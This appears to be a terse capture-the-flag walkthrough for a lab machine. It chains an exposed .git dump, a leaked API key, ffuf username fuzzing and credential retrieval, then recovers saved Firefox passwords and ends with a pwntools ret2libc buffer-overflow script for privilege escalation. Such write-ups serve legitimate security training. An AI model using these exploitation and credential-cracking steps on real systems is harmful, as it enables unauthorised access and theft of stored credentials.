22  
80
 
22/tcp open ssh syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
80/tcp open http syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))  
8081/tcp open http syn-ack ttl 61 Werkzeug httpd 1.0.1 (Python 3.6.9)
 
[http://10.10.55.99](http://10.10.55.99) [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.55.99]
 
[http://10.10.55.99:8081](http://10.10.55.99:8081) [200 OK] Bootstrap[4.1.1], Country[RESERVED][ZZ], HTTPServer[Werkzeug/1.0.1 Python/3.6.9], IP[10.10.55.99], JQuery[3.2.1], Python[3.6.9], Script, Werkzeug[1.0.1], probably WordPress
 
cirius@incognito.com
 
:80/old/.git
 
wget [http://IP/old/.git](http://IP/old/.git) --recursive --continue  
git log -p
 
@app.route('/api/<uname>',methods=['POST'])  
-def info(uname):  
- if(uname == ""):  
- return "Username not provided"  
- print("OK")  
- data=request.get_json(force=True)  
- print(data)  
- if(data['key']=='7454c262d0d5a3a0c0b678d6c0dbc7ef'):  
- if(uname=="admin"):  
- return '{"username":"admin","password":"password"}' ##Default Change them as required  
- elif(uname=="someone"):  
- return '{"username":"someone","password":"someword"}' ##Some other user  
- else:  
- return 'Invalid Username'  
- else:  
- return "Invalid API Key"
   

ffuf -r -timeout 2 -X POST -d '{"key":"7454c262d0d5a3a0c0b678d6c0dbc7ef"}' -u [http://10.10.55.99:8081/api/FUZZ -w /usr/share/wordlists/rockyou.txt:FUZZ](http://10.10.55.99:8081/api/FUZZ -w /usr/share/wordlists/rockyou.txt:FUZZ) -c -fw 2
 
curl -X POST -d '{"key":"7454c262d0d5a3a0c0b678d6c0dbc7ef"}' http://10.10.55.99:8081/api/tommy  
{"username":"tommy","password":"DevMakesStuff01"}
 
SSH with new creds.
 
/etc/hosts  
127.0.1.1 incognito
 
port knock this ip:  
22  
80  
8081
 
{"nextId":2,"logins":[{"id":1,"hostname":"https://incognito.com","httpRealm":null,"formSubmitURL":"","usernameField":"","passwordField":"","encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECH3X/raFuZgKBAigmhgQUXDMnw==","encryptedPassword":"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECIe5VgWeABJZBBB7v9DPVoaXvgQm79RM1WuM","guid":"{32c188bb-6b46-45b4-b566-4b1d8e1c8f87}","encType":1,"timeCreated":1616952631202,"timeLastUsed":1616952631202,"timePasswordChanged":1616952631202,"timesUsed":1}],"potentiallyVulnerablePasswords":[],"dismissedBreachAlertsByLoginGUID":{},"version":3}
   

use firefox-decrypt tool to decrypt the username and password of the firefox profile:  

> [!warning] Only works with key3.db (legacy)

[https://github.com/unode/firefox_decrypt](https://github.com/unode/firefox_decrypt)
 
> get master password using mozilla2john:

[https://github.com/pmittaldev/john-the-ripper/blob/master/doc/README.mozilla](https://github.com/pmittaldev/john-the-ripper/blob/master/doc/README.mozilla)  
Cracking Mozilla Firefox, Thunderbird and SeaMonkey master passwords  
====================================================================
 
1. Install NSS library.
 
a) On Ubuntu, do
 
$ sudo apt-get install libnss3-dev libnspr4-dev
 
b) On CentOS / RHEL / Fedora, do
 
$ sudo yum install nss-devel
 
2. Un-comment HAVE_NSS line in src/Makefile and build JtR.
 
3. Run mozilla2john on key3.db file.
 
4. Run john on output of mozilla2john.
 
5. Wait for master password to get cracked.


**Primary Password for profile 0ryxwn4c.default-release: **

Website:   https://incognito.com
Username: 'dev'
Password: 'Pas$w0RD59247'

su carlJ with the new creds, go to home dir/mailing, find executable, run it.
The executable is vulnerable to ret2libc buffer overflow

```python
from pwn import *

p = process('./smail')

libc_base = 0x7ffff79e2000
system = libc_base + 0x4f550
binsh= libc_base + 0x1b3e1a

POPRDI=0x4007f3

payload = b'A' * 72
payload += p64(0x400556)
payload += p64(POPRDI)
payload += p64(binsh)
payload += p64(system)
payload += p64(0x0)

p.clean()
p.sendline("2")
p.clean()
p.sendline(payload)
p.interactive()
```
